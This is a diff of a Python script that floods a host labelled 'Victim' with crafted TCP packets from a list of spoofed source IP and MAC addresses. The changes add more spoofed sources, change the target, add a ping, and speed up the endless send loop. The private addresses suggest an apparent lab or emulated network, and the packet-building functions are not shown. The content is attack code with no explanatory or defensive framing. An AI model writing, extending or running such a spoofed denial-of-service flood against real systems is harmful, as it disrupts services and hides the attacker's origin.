@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import socket, sys, time, struct, binascii, random
+import socket, sys, time, struct, binascii, random, os
 from tabnanny import check
 
 def setup_connection():
@@ -102,22 +102,23 @@ def send_packet(sock, pkt):
 if __name__ == "__main__":
 
     source_host_list = [
-        ("10.0.0.22", "00:00:00:aa:00:06"),
-        ("10.0.0.23", "00:00:00:aa:00:08"),
-        ("10.0.0.24", "00:00:00:aa:00:09"),
-    ]
-    
+        ("10.0.0.21", "00:00:00:aa:00:05"), ("10.0.1.20", "00:00:00:aa:00:06"),
+        ("10.0.1.21", "00:00:00:aa:00:07"), ("10.0.2.20", "00:00:00:aa:00:08"),
+        ("10.0.2.21", "00:00:00:aa:00:09"), ("10.0.3.20", "00:00:00:aa:00:0a"),
+        ("10.0.3.21", "00:00:00:aa:00:0b")]
+        
     #Victim
-    dst_addr = "10.0.0.21"
-    dst_mac  = "00:00:00:aa:00:05"
+    dst_addr = "10.0.3.20"
+    dst_mac  = "00:00:00:aa:00:0a"
 
     sock = setup_connection()
+    os.system("ping -c 1 10.0.3.20")
     while(True):
         for host in source_host_list:
             print(host)
             src_addr, src_mac = host     
             pkt = prepare_tcp_packet(src_addr, dst_addr, src_mac, dst_mac)
             send_packet(sock, pkt)
-        time.sleep(0.5)
+        time.sleep(0.1)
     
     sock.close()    
